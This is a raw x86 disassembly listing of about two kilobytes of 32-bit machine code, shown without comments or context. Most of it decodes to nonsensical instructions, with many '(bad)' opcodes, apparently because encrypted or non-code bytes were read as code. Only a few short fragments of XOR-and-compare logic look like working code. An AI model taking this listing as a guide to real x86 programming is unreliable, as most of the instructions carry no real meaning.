  40acb9:	or     BYTE PTR [ebx-0x438aa3dd],dh
  40acbf:	imul   ebp,DWORD PTR [ebx-0x7c5f29ba],0x3c303b7d
  40acc9:	es std 
  40accb:	inc    esp
  40accc:	fld    TBYTE PTR [ebx+0x2a]
  40accf:	jmp    0xd046:0xa0f78b80
  40acd6:	ficom  WORD PTR [edi]
  40acd8:	fst    DWORD PTR [esi+0x3e56b254]
  40acde:	and    bl,dh
  40ace0:	pushf  
  40ace1:	lds    edi,FWORD PTR [esi]
  40ace3:	jns    0x40acaa
  40ace5:	jno    0x40ac6d
  40ace7:	cwde   
  40ace8:	mov    dh,0x6f
  40acea:	dec    DWORD PTR [ecx+0x4d]
  40aced:	add    eax,0xf18de030
  40acf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf4:	mov    bl,0xf7
  40acf6:	xor    esp,DWORD PTR [edi]
  40acf8:	jno    0x40ad61
  40acfa:	(bad)  
  40acfb:	ror    edx,cl
  40acfd:	mov    ch,0x3f
  40acff:	imul   ebp,DWORD PTR [ebp-0x6a55de29],0x39
  40ad06:	push   edi
  40ad07:	enter  0xd7e3,0x81
  40ad0b:	cmp    cl,ch
  40ad0d:	pushf  
  40ad0e:	data16 jmp 0x40ace1
  40ad11:	mov    ecx,0x5b6182b6
  40ad16:	and    DWORD PTR [ebp+0x62],edi
  40ad19:	rcr    BYTE PTR [edi+ebp*2],0x9e
  40ad1d:	mov    ebx,0xe3f14237
  40ad22:	xchg   edx,eax
  40ad23:	mov    ah,0xe2
  40ad25:	mov    al,BYTE PTR [ecx+0x1584cb60]
  40ad2b:	sti    
  40ad2c:	pop    es
  40ad2d:	aaa    
  40ad2e:	xchg   esi,eax
  40ad2f:	sbb    ah,bl
  40ad31:	mov    dh,0xba
  40ad33:	rcl    BYTE PTR [ecx+0x23dfeed1],1
  40ad39:	add    eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0xbd4f4c7]
  40ad81:	retf   0xf300
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	pop    edx
  40ad8b:	lds    esp,FWORD PTR [ecx]
  40ad8d:	mov    eax,0x41ae1654
  40ad92:	mov    edx,0xf6a01b7e
  40ad97:	adc    eax,0x751e7ba5
  40ad9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad9d:	rol    BYTE PTR [eax+0x4fd84f00],0xe1
  40ada4:	mov    ecx,0xb1fb3eef
  40ada9:	int    0xdf
  40adab:	mov    BYTE PTR [ecx+0x2f585a08],0x26
  40adb2:	pop    ds
  40adb3:	ins    BYTE PTR es:[edi],dx
  40adb4:	test   eax,0xe2499831
  40adb9:	dec    edx
  40adba:	mov    ah,0x48
  40adbc:	jbe    0x40ade9
  40adbe:	cli    
  40adbf:	scas   al,BYTE PTR es:[edi]
  40adc0:	retf   0xc174
  40adc3:	xor    eax,0xa4601fc7
  40adc8:	dec    ebx
  40adc9:	(bad)  
  40adca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adcb:	pop    esp
  40adcc:	test   BYTE PTR [eax+edx*8-0x3c],cl
  40add0:	or     esp,DWORD PTR ds:0xe4420e79
  40add6:	sahf   
  40add7:	cld    
  40add8:	test   esp,ebx
  40adda:	inc    ebp
  40addb:	sahf   
  40addc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40addd:	repnz mov eax,DWORD PTR fs:[ebx+edi*4-0x1c]
  40ade3:	mov    eax,fs
  40ade5:	and    eax,0xaeb08767
  40adea:	test   BYTE PTR [ebp+0x4819daf],al
  40adf0:	in     al,dx
  40adf1:	add    eax,0xe14cef46
  40adf6:	push   edx
  40adf7:	jmp    0x6981:0xe781b981
  40adfe:	jnp    0x40adce
  40ae00:	and    eax,0x33dd0351
  40ae05:	mov    cl,0x18
  40ae07:	mov    dh,0x2f
  40ae09:	jl     0x40ad93
  40ae0b:	jne    0x40ae71
  40ae0d:	ds push eax
  40ae0f:	jne    0x40ad9f
  40ae11:	push   ebp
  40ae12:	jmp    0x40ada6
  40ae14:	scas   al,BYTE PTR es:[edi]
  40ae15:	clc    
  40ae16:	ror    BYTE PTR [esp+ebx*4+0x78],0x13
  40ae1b:	daa    
  40ae1c:	mov    al,0x7e
  40ae1e:	adc    dl,al
  40ae20:	xchg   ecx,eax
  40ae21:	xchg   edx,eax
  40ae22:	mov    ds:0x7438fef,eax
  40ae27:	popf   
  40ae28:	mov    edi,0xcdcf2d88
  40ae2d:	fcomp  DWORD PTR [eax+edx*4]
  40ae30:	ret    
  40ae31:	and    eax,0x1b53bf99
  40ae36:	pop    esi
  40ae37:	pop    eax
  40ae38:	daa    
  40ae39:	cmp    ebx,ecx
  40ae3b:	dec    ebx
  40ae3c:	xchg   ebx,eax
  40ae3d:	jecxz  0x40addd
  40ae3f:	push   ss
  40ae40:	call   0xc399:0xe2eed4c9
  40ae47:	xchg   esi,eax
  40ae48:	pop    ebp
  40ae49:	dec    edi
  40ae4a:	mov    ebp,0x83dfab91
  40ae4f:	aaa    
  40ae50:	xor    edi,DWORD PTR [ebx]
  40ae52:	addr16 jno 0x40ae9a
  40ae55:	ret    0x25b4
  40ae58:	(bad)  
  40ae59:	inc    ecx
  40ae5a:	(bad)  
  40ae5c:	lahf   
  40ae5d:	ds xchg bx,ax
  40ae60:	push   0x58ce61c9
  40ae65:	xchg   DWORD PTR ds:0xddb4312,ebx
  40ae6b:	aaa    
  40ae6c:	mov    cl,0x68
  40ae6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae6f:	xor    DWORD PTR [edx+0x15bd9419],eax
  40ae75:	inc    ebp
  40ae76:	xchg   esi,eax
  40ae77:	ds ins DWORD PTR es:[edi],dx
  40ae79:	in     eax,0xd2
  40ae7b:	jle    0x40ae27
  40ae7d:	add    al,0xb2
  40ae7f:	(bad)  ds:0x4976d7c1
  40ae85:	mov    ch,0x9e
  40ae87:	iret   
  40ae88:	div    BYTE PTR [esi+eiz*1+0x4b36ef29]
  40ae8f:	ins    DWORD PTR es:[edi],dx
  40ae90:	pop    esi
  40ae91:	jl     0x40ae7b
  40ae93:	push   ss
  40ae94:	imul   eax,DWORD PTR ds:0xd2a70614,0xcc8bfa56
  40ae9e:	or     ecx,ebp
  40aea0:	fcomp  QWORD PTR [edx+0x2f]
  40aea3:	sub    BYTE PTR [ebx-0x60],dh
  40aea6:	iret   
  40aea7:	xchg   esi,eax
  40aea8:	push   cs
  40aea9:	out    dx,al
  40aeaa:	and    al,0x48
  40aeac:	push   ebp
  40aead:	int3   
  40aeae:	mov    BYTE PTR [ebx],ah
  40aeb0:	nop
  40aeb1:	dec    edi
  40aeb2:	iret   
  40aeb3:	cs aas 
  40aeb5:	leave  
  40aeb6:	clc    
  40aeb7:	lock or ch,BYTE PTR [esi]
  40aeba:	lds    edi,FWORD PTR [ecx]
  40aebc:	pop    esp
  40aebd:	ror    BYTE PTR ds:0x7c294cb0,1
  40aec3:	add    eax,0x9e088703
  40aec8:	(bad)  
  40aeca:	sub    bh,dh
  40aecc:	push   DWORD PTR [ecx+0x41d6fe48]
  40aed2:	pushf  
  40aed3:	pusha  
  40aed4:	xchg   esi,eax
  40aed5:	mov    al,ds:0xd1163827
  40aeda:	test   DWORD PTR [ebx+0x12c91ae3],ebp
  40aee0:	call   0xdd16:0xe10c5f28
  40aee7:	xor    ch,BYTE PTR [edx]
  40aee9:	dec    edx
  40aeea:	mov    ebp,0xbfd22bb1
  40aeef:	pop    eax
  40aef0:	in     eax,dx
  40aef1:	adc    DWORD PTR [edx-0x44ae0dd0],ecx
  40aef7:	(bad)  
  40aef8:	fnstsw WORD PTR [ebx-0xae0e28]
  40aefe:	ins    BYTE PTR es:[edi],dx
  40aeff:	call   0x22c7:0x829e7c51
  40af06:	add    BYTE PTR [eax+0x28],cl
  40af09:	sub    eax,0xc4b85607
  40af0e:	addr16 int3 
  40af10:	cmp    BYTE PTR [edx+0x25a80c8b],0xf8
  40af17:	xor    DWORD PTR [edx+0x7b],0x7d
  40af1b:	dec    ecx
  40af1c:	and    al,BYTE PTR [ecx+0x66]
  40af1f:	fwait
  40af20:	xor    dl,BYTE PTR [edi]
  40af22:	call   0x784153b8
  40af27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af28:	sbb    dh,BYTE PTR [ecx]
  40af2a:	lea    edx,[ebx-0x48]
  40af2d:	sbb    bh,BYTE PTR [eax-0x44d4a6c2]
  40af33:	cwde   
  40af34:	mov    ds:0x73392576,eax
  40af39:	push   esi
  40af3a:	push   ebp
  40af3b:	ror    DWORD PTR es:[edi-0x1a870fb2],1
  40af42:	jbe    0x40af2c
  40af44:	sub    BYTE PTR [edx-0x5f],ch
  40af47:	adc    BYTE PTR [ecx],dl
  40af49:	inc    esi
  40af4a:	ss pushf 
  40af4c:	mov    dh,0x13
  40af4e:	std    
  40af4f:	stc    
  40af50:	adc    BYTE PTR [ebp-0x38],dh
  40af53:	fsub   DWORD PTR [ecx+0x2]
  40af56:	jp     0x40afcb
  40af58:	fcomp  QWORD PTR ds:0xb39b2cca
  40af5e:	xor    DWORD PTR [eax+0x35],ecx
  40af61:	pop    eax
  40af62:	stos   BYTE PTR es:[edi],al
  40af63:	inc    eax
  40af64:	dec    esp
  40af65:	mov    dh,0x6d
  40af67:	or     ah,BYTE PTR [eax-0x28]
  40af6a:	xlat   BYTE PTR ds:[ebx]
  40af6b:	fwait
  40af6c:	or     cl,BYTE PTR [ebx-0x2e]
  40af6f:	das    
  40af70:	jecxz  0x40afb3
  40af72:	xor    DWORD PTR [edx+0x4],esp
  40af75:	mov    ah,0x34
  40af77:	mov    ebp,0xd7f3f76d
  40af7c:	icebp  
  40af7d:	dec    ebp
  40af7e:	dec    ecx
  40af7f:	adc    BYTE PTR [ecx-0x57a436c8],0xb2
  40af86:	add    cl,BYTE PTR [ebp-0x582c78cf]
  40af8c:	dec    eax
  40af8d:	adc    DWORD PTR [ebx],ebp
  40af8f:	cwde   
  40af90:	outs   dx,DWORD PTR ds:[esi]
  40af91:	test   DWORD PTR [esp+edi*4-0x33],0x31a98cf6
  40af99:	(bad)  
  40af9a:	xchg   ebx,eax
  40af9b:	ffree  st(5)
  40af9d:	gs mov ch,0x6b
  40afa0:	ss inc edx
  40afa2:	mov    cl,0xeb
  40afa4:	fsin   
  40afa6:	inc    esi
  40afa7:	inc    DWORD PTR [edi]
  40afa9:	mov    ch,0xaa
  40afab:	fwait
  40afac:	sbb    eax,0xc9e91ec9
  40afb1:	adc    BYTE PTR [esi+0x22ae9658],0x36
  40afb8:	xchg   DWORD PTR [esi+eiz*8+0x5],ebp
  40afbc:	scas   al,BYTE PTR es:[edi]
  40afbd:	mov    BYTE PTR [edi+0x271d696],ah
  40afc3:	add    BYTE PTR [edx],bh
  40afc5:	daa    
  40afc6:	adc    edi,edx
  40afc8:	adc    eax,0x80a410f
  40afcd:	and    eax,0xfd385716
  40afd2:	push   edx
  40afd3:	outs   dx,DWORD PTR ds:[esi]
  40afd4:	call   0x3dd7c57
  40afd9:	cld    
  40afda:	jg     0x40af90
  40afdc:	dec    edx
  40afdd:	mov    BYTE PTR [eax-0x47041ac0],ch
  40afe3:	adc    eax,0x877a532
  40afe8:	sar    BYTE PTR [edx-0x4e],1
  40afeb:	pop    ds
  40afec:	bound  ecx,QWORD PTR ds:0xed8d1674
  40aff2:	inc    eax
  40aff3:	neg    DWORD PTR [ecx]
  40aff5:	and    eax,0x72b37cd5
  40affa:	lods   al,BYTE PTR ds:[esi]
  40affb:	int3   
  40affc:	and    ah,BYTE PTR [eax+edi*1-0x3f]
  40b000:	fadd   QWORD PTR [edx+0x5260954f]
  40b006:	stos   BYTE PTR es:[edi],al
  40b007:	lahf   
  40b008:	(bad)  
  40b009:	call   0x8cb8:0x50141a45
  40b010:	lock and eax,0x7b24d34a
  40b016:	mov    dl,bh
  40b018:	fdiv   st(6),st
  40b01a:	in     al,dx
  40b01b:	pop    edx
  40b01c:	add    BYTE PTR [eax-0x135a7cc9],dh
  40b022:	test   DWORD PTR [esp+ebp*2+0x5da9593c],eax
  40b029:	adc    BYTE PTR [edi-0x43af918e],al
  40b02f:	ficom  DWORD PTR [ebp-0x28217a31]
  40b035:	add    DWORD PTR [edi-0x1c],0xffffffba
  40b039:	add    bl,BYTE PTR [ebp+0xbad68df]
  40b03f:	inc    ebx
  40b040:	push   ecx
  40b041:	xchg   ebp,eax
  40b042:	adc    BYTE PTR [edx+0x3b],ch
  40b045:	in     eax,dx
  40b046:	push   cs
  40b047:	leave  
  40b048:	mov    ebp,0xb7814929
  40b04d:	xor    BYTE PTR [ebx],bh
  40b04f:	xchg   esi,eax
  40b050:	nop
  40b051:	adc    DWORD PTR [ecx+eiz*4+0x51],ecx
  40b055:	imul   esp,DWORD PTR [ebx],0x9
  40b058:	push   esi
  40b059:	sub    bh,ah
  40b05b:	mov    al,0x47
  40b05d:	lahf   
  40b05e:	repnz and BYTE PTR [esi+eiz*8-0x36],cl
  40b063:	xor    ebx,DWORD PTR [eax+edi*8]
  40b066:	es xor al,0x64
  40b069:	adc    BYTE PTR [eax+eiz*2],al
  40b06c:	lods   al,BYTE PTR ds:[esi]
  40b06d:	(bad)  
  40b06e:	sub    BYTE PTR [eax-0x11],dl
  40b071:	pop    es
  40b072:	xor    eax,0xa6a02170
  40b077:	jp     0x40b061
  40b079:	and    dh,BYTE PTR [esi+edx*2+0x4b]
  40b07d:	sbb    al,0x6f
  40b07f:	xor    BYTE PTR [eax-0xaf7d6c9],bh
  40b085:	push   ecx
  40b086:	pop    esp
  40b087:	gs lahf 
  40b089:	(bad)  
  40b08a:	add    al,0x77
  40b08c:	xchg   edi,eax
  40b08d:	mov    cl,BYTE PTR [ebx+0x4d8be045]
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	ja     0x40b0f3
  40b0bb:	xchg   ecx,eax
  40b0bc:	outs   dx,BYTE PTR ds:[esi]
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	add    eax,0x6aaaf59f
  40b0ca:	dec    esp
  40b0cb:	stos   BYTE PTR es:[edi],al
  40b0cc:	dec    ebp
  40b0cd:	stos   BYTE PTR es:[edi],al
  40b0ce:	pop    eax
  40b0cf:	dec    esp
  40b0d0:	mov    ch,0xc8
  40b0d2:	ja     0x40b074
  40b0d4:	xchg   edx,eax
  40b0d5:	xlat   BYTE PTR ds:[ebx]
  40b0d6:	dec    eax
  40b0d7:	pop    edx
  40b0d8:	cmp    BYTE PTR [edi+ecx*8-0x4bcfc27d],ah
  40b0df:	aam    0x90
  40b0e1:	in     al,dx
  40b0e2:	sub    BYTE PTR [ecx-0x24],bl
  40b0e5:	arpl   ax,di
  40b0e7:	add    al,0x18
  40b0e9:	push   edi
  40b0ea:	jmp    0x40b11f
  40b0ec:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b0ee:	popa   
  40b0ef:	std    
  40b0f0:	stos   DWORD PTR es:[edi],eax
  40b0f1:	jp     0x40b15c
  40b0f3:	test   eax,0xbd9ec8d6
  40b0f8:	fcmovb st,st(7)
  40b0fa:	push   ss
  40b0fb:	ret    0x5d76
  40b0fe:	jne    0x40b103
  40b100:	int    0xe6
  40b102:	ins    BYTE PTR es:[edi],dx
  40b103:	clc    
  40b104:	sti    
  40b105:	mov    al,0xfa
  40b107:	xor    BYTE PTR [edi+0x4],ch
  40b10a:	call   0xfe923063
  40b10f:	jb     0x40b0b5
  40b111:	mov    ds:0xa00ca7fe,al
  40b116:	lods   al,BYTE PTR ds:[esi]
  40b117:	jecxz  0x40b131
  40b119:	push   es
  40b11a:	fisub  DWORD PTR ds:0xaa960947
  40b120:	fisub  DWORD PTR [ecx+edx*8]
  40b123:	retf   
  40b124:	push   ds
  40b125:	mov    esi,0xdf717dab
  40b12a:	xchg   edx,eax
  40b12b:	fimul  WORD PTR [ebx-0x1a]
  40b12e:	rcr    DWORD PTR [ebp+0x2f],1
  40b131:	or     al,BYTE PTR [ecx+0x71]
  40b134:	mov    dl,0xa
  40b136:	inc    esi
  40b137:	in     al,0xa8
  40b139:	data16 sar BYTE PTR [edi+eax*4-0x40],cl
  40b13e:	adc    eax,0xdeac5057
  40b143:	loop   0x40b126
  40b145:	inc    esi
  40b146:	xor    esi,DWORD PTR [ecx-0x34]
  40b149:	rcpps  xmm7,XMMWORD PTR [edi-0x7cd28102]
  40b150:	std    
  40b151:	in     al,0x81
  40b153:	(bad)  
  40b154:	push   esi
  40b155:	je     0x40b11d
  40b157:	dec    esi
  40b158:	jg     0x40b1ad
  40b15a:	retf   0x5a28
  40b15d:	aad    0x77
  40b15f:	and    al,0xba
  40b161:	jae    0x40b169
  40b163:	addr16 clc 
  40b165:	cmp    dh,BYTE PTR [edi-0xc]
  40b168:	adc    dl,BYTE PTR [esi+ebp*4+0x1c873ef0]
  40b16f:	jp     0x40b18d
  40b171:	jmp    0x40b19f
  40b173:	sbb    edi,DWORD PTR [ebp+0x41]
  40b176:	jbe    0x40b165
  40b178:	and    dh,BYTE PTR [ebp-0x41]
  40b17b:	lds    eax,FWORD PTR [esp+ebx*1-0xf5c704c]
  40b182:	scas   al,BYTE PTR es:[edi]
  40b183:	xchg   edi,eax
  40b184:	dec    edx
  40b185:	repnz push ebx
  40b187:	(bad)  
  40b188:	mov    edx,0xa7fe62f1
  40b18d:	inc    ebp
  40b18e:	fistp  QWORD PTR [ebx+0x47]
  40b191:	adc    ebp,DWORD PTR [ecx]
  40b193:	int    0xad
  40b195:	cmc    
  40b196:	ins    BYTE PTR es:[edi],dx
  40b197:	ret    
  40b198:	(bad)  
  40b199:	out    dx,al
  40b19a:	dec    ecx
  40b19b:	aaa    
  40b19c:	xchg   DWORD PTR [ebx-0x5a],ecx
  40b19f:	or     BYTE PTR [eax-0x68958e60],dh
  40b1a5:	icebp  
  40b1a6:	jecxz  0x40b1f8
  40b1a8:	je     0x40b1c5
  40b1aa:	mov    DWORD PTR [ecx+0x72a44869],ebx
  40b1b0:	nop
  40b1b1:	add    BYTE PTR [edi+0x35fa56ff],0x1a
  40b1b8:	inc    ebx
  40b1b9:	xor    BYTE PTR [ebx+ecx*2],dh
  40b1bc:	aaa    
  40b1bd:	sbb    bh,ch
  40b1bf:	push   0x47
  40b1c1:	lods   eax,DWORD PTR ds:[esi]
  40b1c2:	or     BYTE PTR [ebx-0x43a73c89],cl
  40b1c8:	adc    dl,BYTE PTR [eax-0x14]
  40b1cb:	cld    
  40b1cc:	or     BYTE PTR [ecx],ch
  40b1ce:	scas   eax,DWORD PTR es:[edi]
  40b1cf:	pop    ecx
  40b1d0:	mov    eax,DWORD PTR [edx+0x3b]
  40b1d3:	sub    eax,0xe7c9d175
  40b1d8:	loope  0x40b24b
  40b1da:	push   ecx
  40b1db:	push   ds
  40b1dc:	ds or  al,0x94
  40b1df:	jbe    0x40b1de
  40b1e1:	aad    0x4c
  40b1e3:	aad    0x8b
  40b1e5:	cmp    eax,0x20c2951b
  40b1ea:	mov    ah,0x1c
  40b1ec:	cld    
  40b1ed:	rcl    BYTE PTR [esi],1
  40b1ef:	ja     0x40b231
  40b1f1:	pushf  
  40b1f2:	or     DWORD PTR [eax-0x5a057cb5],ecx
  40b1f8:	shl    esi,0xda
  40b1fb:	jmp    0x40b21a
  40b1fd:	jp     0x40b1ae
  40b1ff:	dec    edi
  40b200:	test   al,0xdc
  40b202:	inc    ebp
  40b203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b204:	aam    0xa6
  40b206:	aam    0x0
  40b208:	fxch   st(6)
  40b20a:	mov    bl,0xa
  40b20c:	dec    edi
  40b20d:	mov    dl,0x72
  40b20f:	dec    esp
  40b210:	and    DWORD PTR [edi-0x2e688760],ebp
  40b216:	dec    esp
  40b217:	out    0x95,eax
  40b219:	(bad)  
  40b21a:	mov    dh,0x48
  40b21c:	popa   
  40b21d:	inc    ecx
  40b21e:	cmp    esp,DWORD PTR [edi+0x31fa1f71]
  40b224:	arpl   WORD PTR [ebx+0x4d53b111],sp
  40b22a:	mov    ch,0x3
  40b22c:	fisttp DWORD PTR [edi+0x49]
  40b22f:	pusha  
  40b230:	psubusb xmm7,xmm3
  40b234:	push   DWORD PTR [ebx]
  40b236:	stos   DWORD PTR es:[edi],eax
  40b237:	jo     0x40b2ad
  40b239:	fwait
  40b23a:	push   edi
  40b23b:	mov    al,ds:0x7bc1d15c
  40b240:	test   al,0x1b
  40b242:	test   eax,0x3aa9d858
  40b247:	neg    DWORD PTR [edi]
  40b249:	and    BYTE PTR [eax-0x10],0x78
  40b24d:	push   cs
  40b24e:	jmp    0x40b1d7
  40b250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b251:	rol    DWORD PTR [eax-0x18d93624],0xf5
  40b258:	sub    bh,BYTE PTR [esi+edx*4-0x52c01678]
  40b25f:	daa    
  40b260:	and    dh,BYTE PTR [edx+0x30]
  40b263:	das    
  40b264:	lds    ebp,FWORD PTR [bp+si-0x7d]
  40b268:	loope  0x40b223
  40b26a:	xor    al,0x3a
  40b26c:	dec    edi
  40b26d:	add    ebp,DWORD PTR [eax+0x4b]
  40b270:	mov    ds:0xd67fa3bd,al
  40b275:	add    DWORD PTR [edi+0x2e],0x86eeee49
  40b27c:	xor    BYTE PTR [ebx],al
  40b27e:	mov    cl,0x52
  40b280:	lea    ebx,[esi-0x5644bfdb]
  40b286:	imul   ecx,DWORD PTR [edi+0x7a],0x6fcc01e4
  40b28d:	jp     0x40b256
  40b28f:	mov    al,0x29
  40b291:	jno    0x40b2d6
  40b293:	sbb    edx,DWORD PTR [ecx]
  40b295:	sub    DWORD PTR [ecx-0x79cefc10],ecx
  40b29b:	dec    ecx
  40b29c:	retf   0x1559
  40b29f:	ror    BYTE PTR [eax+eiz*1+0x1d8834e5],1
  40b2a6:	mov    eax,ds:0xc83a88a3
  40b2ab:	mov    esp,0xc68aef59
  40b2b0:	jbe    0x40b2c1
  40b2b2:	retf   
  40b2b3:	xor    al,0x8b
  40b2b5:	sti    
  40b2b6:	xor    ebx,DWORD PTR [ebp-0x2c]
  40b2b9:	ret    
  40b2ba:	jl     0x40b29e
  40b2bc:	mov    dh,BYTE PTR ds:0x907b1b3d
  40b2c2:	frstor ds:0xc65655e1
  40b2c8:	add    al,0xe4
  40b2ca:	popa   
  40b2cb:	ds ss and cl,0xab
  40b2d0:	adc    BYTE PTR [edx+0x175fdab4],ah
  40b2d6:	or     ebx,DWORD PTR [edi]
  40b2d8:	sub    DWORD PTR [ecx+0x13],eax
  40b2db:	jmp    0xce4e:0x3a2dbccb
  40b2e2:	leave  
  40b2e3:	imul   edi,DWORD PTR [ecx],0x3c
  40b2e6:	cs ret 0x74b3
  40b2ea:	dec    edx
  40b2eb:	and    DWORD PTR [eax],ebp
  40b2ed:	popf   
  40b2ee:	mov    ebp,0x9ab6bb77
  40b2f3:	ins    DWORD PTR es:[di],dx
  40b2f5:	or     DWORD PTR [ebx],ebx
  40b2f7:	out    0x2a,eax
  40b2f9:	pop    ebx
  40b2fa:	jbe    0x40b27d
  40b2fc:	and    cl,0xf4
  40b2ff:	inc    esi
  40b300:	ins    BYTE PTR es:[edi],dx
  40b301:	xchg   BYTE PTR [edi],bh
  40b303:	cmp    dh,ah
  40b305:	sahf   
  40b306:	(bad)  
  40b307:	and    BYTE PTR [esi+0x772bb3aa],0x33
  40b30e:	cmp    ebx,ebx
  40b310:	push   0x32245337
  40b315:	sub    eax,0x519494fc
  40b31a:	rcr    DWORD PTR gs:[eax-0x5],cl
  40b31e:	mov    ?,WORD PTR [edx]
  40b320:	aas    
  40b321:	cs ja  0x40b307
  40b324:	bound  esi,QWORD PTR [ecx+0x70]
  40b327:	es pop es
  40b329:	leave  
  40b32a:	xor    ebx,ebp
  40b32c:	xchg   esp,eax
  40b32d:	mov    edi,0xbcac6282
  40b332:	mov    al,ds:0xdb170912
  40b337:	(bad)  
  40b338:	cld    
  40b339:	push   cs
  40b33a:	(bad)  
  40b33b:	jg     0x40b357
  40b33d:	jne    0x40b2d6
  40b33f:	scas   al,BYTE PTR es:[edi]
  40b340:	mov    ah,0xf1
  40b342:	pop    edx
  40b343:	jle    0x40b379
  40b345:	sub    BYTE PTR [esi-0x7bc8ef3f],0x2a
  40b34c:	sub    al,0x11
  40b34e:	jno    0x40b3ca
  40b350:	pushf  
  40b351:	loopne 0x40b305
  40b353:	or     eax,0xcbd11edc
  40b358:	test   BYTE PTR [edx-0x31d6919],bl
  40b35e:	bound  ecx,QWORD PTR [eax+0x50e59cf2]
  40b364:	out    dx,eax
  40b365:	fcomp  QWORD PTR [eax+0x69]
  40b368:	(bad)  
  40b369:	fiadd  WORD PTR [esi+ebp*4+0x5]
  40b36d:	jge    0x40b330
  40b36f:	jp     0x40b357
  40b371:	and    ecx,DWORD PTR [ebx+0xbe284f0]
  40b377:	cwde   
  40b378:	cs dec esi
  40b37a:	fbstp  TBYTE PTR [eax-0x42]
  40b37d:	sbb    edx,DWORD PTR ds:0x1a0d96b8
  40b383:	inc    esp
  40b384:	sub    al,0xd6
  40b386:	daa    
  40b387:	outs   dx,BYTE PTR ds:[esi]
  40b388:	stos   BYTE PTR es:[edi],al
  40b389:	pop    esp
  40b38a:	in     eax,0xa4
  40b38c:	xchg   esi,eax
  40b38d:	repnz inc esp
  40b38f:	sub    al,0x12
  40b391:	ins    DWORD PTR es:[edi],dx
  40b392:	jo     0x40b3ac
  40b394:	addr16 mov bl,0x3c
  40b397:	mov    al,cl
  40b399:	pop    ss
  40b39a:	jno    0x40b3e9
  40b39c:	pop    ss
  40b39d:	jle    0x40b384
  40b39f:	out    dx,eax
  40b3a0:	or     eax,0xcded38dc
  40b3a5:	or     al,0x6d
  40b3a7:	retf   0x844b
  40b3aa:	ficom  DWORD PTR [edx]
  40b3ac:	push   ecx
  40b3ad:	push   cs
  40b3ae:	inc    ecx
  40b3af:	or     esp,DWORD PTR [esp+ecx*8+0x57]
  40b3b3:	jo     0x40b3c3
  40b3b5:	ds sbb eax,0x180180ea
  40b3bb:	push   edi
  40b3bc:	dec    eax
  40b3bd:	(bad)  
  40b3be:	xlat   BYTE PTR ds:[ebx]
  40b3bf:	inc    ebx
  40b3c0:	inc    edx
  40b3c1:	ja     0x40b3ca
  40b3c3:	fisubr DWORD PTR [ebp-0x19]
  40b3c6:	dec    esp
  40b3c7:	push   0x8458bb4
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x446a88bc
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	push   0x49
  40b3f2:	push   0xa88b6e48
  40b3f7:	and    al,dh
  40b3f9:	lods   eax,DWORD PTR ds:[esi]
  40b3fa:	push   ss
  40b3fb:	xor    BYTE PTR [ebx*1-0xfca6aa1],cl
  40b402:	test   eax,0xc0a3b71a
  40b407:	jnp    0x40b3e7
  40b409:	sbb    al,0x70
  40b40b:	mov    ds:0xfc253793,al
  40b410:	ret    
  40b411:	mov    esi,0xee774c94
  40b416:	or     ebp,0x68
  40b419:	mov    ds:0xeb5c7101,eax
  40b41e:	out    dx,eax
  40b41f:	scas   eax,DWORD PTR es:[edi]
  40b420:	and    edx,DWORD PTR ds:0xa99112d5
  40b426:	stc    
  40b427:	fwait
  40b428:	adc    ebp,DWORD PTR [edx-0x2]
  40b42b:	or     eax,0x6699e77c
  40b430:	push   cs
  40b431:	enter  0xa35e,0x91
